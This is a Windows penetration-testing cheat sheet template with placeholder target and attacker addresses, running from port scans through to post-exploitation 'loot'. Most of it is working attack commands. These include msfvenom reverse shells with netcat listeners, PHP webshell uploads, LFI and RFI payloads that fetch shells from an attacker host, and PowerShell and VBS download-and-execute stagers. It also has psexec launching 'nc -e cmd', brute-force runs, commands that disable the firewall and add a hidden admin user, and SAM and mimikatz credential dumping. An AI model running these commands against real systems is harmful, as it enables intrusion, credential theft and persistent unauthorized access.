# Windows Info Sheet

### Shellcode
```
# Binary
msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f exe -o shell.exe
nc -lvnp 4444
```
### Webshell
```
# PHP Download Execute
msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
python -m SimpleHTTPServer 80
nc -lvnp 443

# PHP
msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
*use meterpreter multihandler

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
nc -lvnp 443

Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
shell.php%00.jpeg
```

### Full TCP Scan
INSERTFULLTCPSCAN
```
nmap -sV -Pn -p1-65535 --max-retries 1 --max-scan-delay 10 --defeat-rst-ratelimit --open -T4 INSERTIPADDRESS
```
### Full UDP Scan
INSERTUDPSCAN
```
nmap -Pn -A -sC -sU -T 4 --top-ports 200 INSERTIPADDRESS
```
### Vuln Scan
INSERTVULNSCAN
```
nmap --script=vuln INSERTIPADDRESS
```
### Other scans
```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Connect to tcp if one is open
nc -nv INSERTIPADDRESS 5472

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC

```

### Port 21 - FTP
INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
hydra -I -e ns -l administrator -P /usr/share/wordlists/rockyou.txt ftp://INSERTIPADDRESS
If anonymous is allowed, apt install ftp 
ftp INSERTIPADDRESS
mput and mget to grab wild card files
```

### Port 22 - SSH
INSERTSSHCONNECT

INSERTSSHBRUTE

```
hydra -I -e ns -l administrator -P /usr/share/wordlists/rockyou.txt ssh://INSERTIPADDRESS
```

### Port 25 - SMTP
INSERTSMTPCONNECT

```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/http_default_users.txt -t INSERTIPADDRESS
smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/http_default_users.txt-t INSERTIPADDRESS
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/http_default_users.txt -t INSERTIPADDRESS
```

### Port 53 - DNS
```
For Windows hosts, you can pull all DNS records with any authenticated user
adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp
Or just regular enumeration
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t
```

### Port 69 - TFTP
```
nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=/usr/share/metasploit-framework/data/wordlists/tftp.txt INSERTIPADDRESS
```

### Port 110 - Pop3
INSERTPOP3CONNECT

```
telnet INSERTIPADDRESS 110
USER pelle@INSERTIPADDRESS
PASS admin
or:
USER pelle
PASS admin
# List all emails
list
stat
# Retrieve email number 5, for example
retr 9
```

### Port 143/993 - Imap
```
nmap -p 143,993 --script imap-brute INSERTIPADDRESS
```

### Port 135 - MSRPC
INSERTRPCMAP

### Port 111 - Rpcbind
```
rpcinfo -p INSERTIPADDRESS
```

### Port 139/445 
INSERTSMBMAP

```
Enumerating Shares
enum4linux -a INSERTIPADDRESS
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=guest,smbpass=guest -p445 INSERTIPADDRESS
crackmapexec --share INSERTIPADDRESS

Null Sessions
echo exit | smbclient -L \\\\INSERTIPADDRESS

Mounting Shares to Kali
mkdir /tmp/share
mount -t cifs //INSERTIPADDRESS/C$ /tmp/share

Enumerate Users
nmap -sU -sS --script=smb-enum-users -p U:137,T:INSERTIPADDRESS
crackmapexec smb --users INSERTIPADDRESS
crackmapexec smb --loggedon-users INSERTIPADDRESS
rpcclient -U james INSERTIPADDRESS
  enumdomuser
  enumalsgroups domain
  enumalsgroups builtin
  lookupnames <name> (for SID)
  
Password Policy
crackmapexec smb --pass-pol INSERTIPADDRESS

RCE
winexe --system -U 'DOMAIN\USER%PASSWORD' //TARGET_IP cmd.exe

Windows Server GPP files
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Look for XML files such as Drives.xml, DataSources.xml, Groups.xml, Printers.xml, ScheduledTasks.xml...
```

### Password Policy
INSERTSAMRDUMP

```
https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
enum4linux -a INSERTIPADDRESS
rpcclient -U "" INSERTIPADDRESS
smbclient //INSERTIPADDRESS/ipc$ 
impacket tools
```

### Port 161/162 UDP - SNMP
INSERTSNMPSCAN

```
Look for installed programs and other ports that are opened and may have been missed

nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
snmp-check INSERTIPADDRESS -c public
# Common community strings
public
private
community
```

### Port 389 - LDAP
```
Will change depending on binding mode, with anonymous binding though...

nmap -p 389 --script ldap-search INSERTIPADDRESS
nmap -p 389 --script ldap-brute INSERTIPADDRESS
```

### Port 443 - HTTPS
INSERTSSLSCAN

```
sslscan INSERTIPADDRESS:443
```

### Port 1030/1032/1033/1038
Used by RPC to connect in domain network.

### Port 1433 MSSQL
```
nmap -p 445 --script ms-sql-info INSERTIPADDRESS
crackmapexec mssql < -L to list modules>
```

### Port 1521 - Oracle

- Name:
- Version:
- Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```

### Port 2049 - NFS
INSERTNFSSCAN

```
showmount -e INSERTIPADDRESS
If you find anything you can mount it like this:
mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

- Name:
- Version:
- Default logins:

```
sys:sys
scott:tiger

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
```

### 3306 - MySQL

- Name:
- Version:

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306

mysql --host=INSERTIPADDRESS -u root -p
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:

## Webservers 

### Automated Checks
INSERTWIGSCAN

INSERTWIGSSLSCAN
```
wig-git -t 50 -q -d http://INSERTIPADDRESS/path

uniscan -f /usr/share/wordlists/dir/big.txt -bqweds -u http://INSERTIPADDRESS/path
```
### Nikto scan
INSERTNIKTOSCAN
```
# Full Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
```
### Directories
INSERTDIRBSCAN

INSERTDIRBSSLSCAN
```
# Common directories and extensions
gobuster -u http://INSERTIPADDRESS -e -n -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.asp,.html,.pl,.js,.py,.aspx,.htm,.xhtml

# Most directories and extension
gobuster -u http://INSERTIPADDRESS -e -n -f -w /usr/share/wordlists/dirb/big.txt -t 100 -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml

```
### Robots
INSERTROBOTS

### Webapp Firewall
INSERTWAFSCAN

INSERTWAFSSLSCAN
```
wafw00f http://INSERTIPADDRESS/path -a
```

### Default/Weak login
Google documentation for default passwords and test them:
```
http://open-sez.me/
https://cirt.net/passwords
```
### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

### Manual Checks

```
Step 1:
View Source/Page for PII

Step 2: 
# Start Secondary Scans

# Get header and page
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl --user login:password --upload-file your.file.txt http://INSERTIPADDRESS
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# User-agent test
ua-tester -u http://INSERTIPADDRESS -d MDCTB

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o windows

Step 3:
Burp
Send page to repeater
  Look for headers that can be fuzzed
  ID= that can be changed
Send cookies to sequencer
Send curious strings to decrypter
```

### LFI/RFI

```
# FImap
fimap -u "http://INSERTIPADDRESS/example.php" -v 3
http://kaoticcreations.blogspot.com/2011/08/automated-lfirfi-scanning-exploiting.html

# Checks
http://INSERTIPADDRESS/?page=../../../../windows/system32/drivers/etc/hosts
http://INSERTIPADDRESS/?page=../../../../windows/system32/drivers/etc/hosts%00
http://INSERTIPADDRESS/?page=%2f..%2f..%2fwindows/system32/drivers/etc/hosts
http://INSERTIPADDRESS/?page=%2f..%2f..%2fwindows/system32/drivers/etc/hosts%00

http://INSERTIPADDRESS/?page=expect://dir
*If you get a warning include() error it is not affected
Else for shell:
POST this with tamper data to http://INSERTIPADDRESS/gallery.php?page=expect://dir
<? system('wget http://10.11.0.150/php-reverse-shell.php -O /inetpub/wwwroot/shell.php');?>
Then navigate to
http://INSERTIPADDRESS/shell.php

# Bypass extension
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=../../../../windows/system32/drivers/etc/hosts
base64 -d output of above

# Remote File Inclusion
python -m SimpleHTTPServer 80
http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt%00
http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt?
```

### Sql-login-bypass

```
# Login Bypass Checks
Username/Password: 
1' or '1'='1 
1' or 1=1 LIMIT 1;# 
'or 1=1/*
'or '1'='1' --
'or '1'='1' ({
'or '1'='1' /*

# Automated
- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation
```

### SQL-Injection

```
# Post
get post request from Burp and save as search-test.txt
sqlmap -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

### WebDav

```
cadaver INSERTIPADDRESS
Try to put a shell.asp

cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp

put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.asp
If the .asp extention is not allowed, try shell.asp.txt and use the mv command

user: wampp
pass: xampp 
```
### Password brute force - last resort

```
cewl http://INSERTIPADDRESS
```
----------------------------------------------------------------------------


-----------------------------------------------------------------------------
# Privesc

### First Steps

```
Upload files
Host:
cd /root/Dropbox/Scripts/Post_Windows/uploads && python -m SimpleHTTPServer 8080

Target:
cd %temp%

echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs && echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs && echo Err.Clear >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs && echo http.Open "GET", strURL, False >> wget.vbs && echo http.Send >> wget.vbs && echo varByteArray = http.ResponseBody >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs && echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs && echo strData = "" >> wget.vbs && echo strBuffer = "" >> wget.vbs && echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs && echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs && echo Next >> wget.vbs && echo ts.Close >> wget.vbs

cscript.exe wget.vbs http://MYIPADDRESS:8080/wget.exe wget.exe

wget.exe http://MYIPADDRESS:8080/ -r && move MYIPADDRESS+8080 exploits && cd exploits && del index.html

START /B windows-privesc-check2.exe --audit -a -o wpc-report && START /B accesschk.exe -uwcqv "Authenticated Users" * /accepteula && START /B seatbelt.exe all > seatbelt-report

OR with Powershell
powershell -c (New-Object System.Net.WebClient).DownloadFile('http://MYIPADDRESS:8080/seatbelt.exe','seatbelt.exe')
seatbelt.exe all > seatbelt-report

***If Windows 7 and above***
msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f psh -o shell_80.ps1
powershell -ExecutionPolicy Bypass -NoExit -File shell_80.ps1

OR

Empire:
python /opt/Empire/empire
listeners
uselistener http
set Name INSERTIPADDRESS
set Host http://MYIPADDRESS
execute

launcher powershell INSERTIPADDRESS

Copy and paste output in terminal

***If you need a stager***
usestager windows/launcher_bat (or whatever can run on host)
set Listener INSERTIPADDRESS
generate 

Upload and run payload
cd /tmp
python -m SimpleHTTPServer 8888

powershell -c (New-Object System.Net.WebClient).DownloadFile('http://INSERTIPADDRESS:8888/launcher.bat','launcher.bat')

Once you get a connection
agents
interact <agent_name>
usemodule privesc/powerup/allchecks
set Agent <agent_name>
execute 
***Let run for a few minutes

Windows XP and Server 2003:
Host:
atftpd --daemon --port 69 /root/Dropbox/Scripts/Post_Windows/uploads
Target:
tftp -i INSERTIPADDRESS GET wget.exe

If you get creds:
nc -lvnp 6666
psexec -u alice -p aliceishere -c "nc.exe" MYIPADDRESS 6666 -e cmd 

Else:
bypassuac INSERTIPADDRESS

usemodule privesc/bypassuac_wscript
set Listener INSERTIPADDRESS
execute

```
### Basic info

**Users:**
```
net users
```
**Localgroups:**
```
net localgroup administrators
```
**Firewall**
```
netsh firewall show state
netsh firewall show config
```
**Metaploit**
```
use post/multi/recon/local_exploit_suggester
use post/windows/gather/enum_applications
use post/windows/gather/enum_unattend
use post/windows/gather/enum_patches 
use exploit/windows/local/trusted_service_path
use exploit/windows/local/service_permissions
```
### Set path
```
set PATH=%PATH%;C:\xampp\php
```
### Kernel exploits
```
systeminfo
```
***Paste Output***

```
Host:
cd /root/Dropbox/Engagements/INSERTIPADDRESS/privesc/ && touch sysinfo && nano sysinfo
```

***Paste Output***

```
python ~/Dropbox/Scripts/Post_Windows/windows-exp-suggester/check_exploits.py --database ~/Dropbox/Scripts/Post_Windows/windows-exp-suggester/2017-12-20-mssb.xls --systeminfo /root/Dropbox/Engagements/INSERTIPADDRESS/privesc/sysinfo | grep -v Internet
```

***Paste Output***

```
# Look for hotfixes

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
https://github.com/SecWiki/windows-kernel-exploits
site:exploit-db.com windows XX XX
```

### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Windows Server GPP files
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Look for XML files such as Drives.xml, DataSources.xml, Groups.xml, Printers.xml, ScheduledTasks.xml...

#TGT Services/Kerberoasting
Impacket tools 
./GetNPUsers.py DOMAIN/USER:PASSWORD -dc-ip 10.10.10.100 -request
./GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip 10.10.10.100 -request

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Reconfigure service parameters

- Unquoted service paths

Check book for instructions

- Weak service permissions

Check book for instructions

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
netstat /a
netstat -ano
```

### Programs running as root/system



### Installed software

```
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```

### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak/Stored passwords
```
cd \
findstr /si password *.xml *.ini *.txt
```

### Useful commands
**Firewall**

```
Turn firewall off
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
netsh advfirewall set currentprofile state off

```
**Add user and enable RDP**

```
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

Turn firewall off
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
netsh advfirewall set currentprofile state off

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Or like this
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```



------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT -------------------




------------------------------------------------------------------------


## Loot

- Proof:
- Network secret:
- Password and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:

### Proof

### Network secret

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Mail

### Browser

- Browser start-page:
- Browser-history:
- Saved passwords:

### Databases

### SSH-keys

## How to replicate:
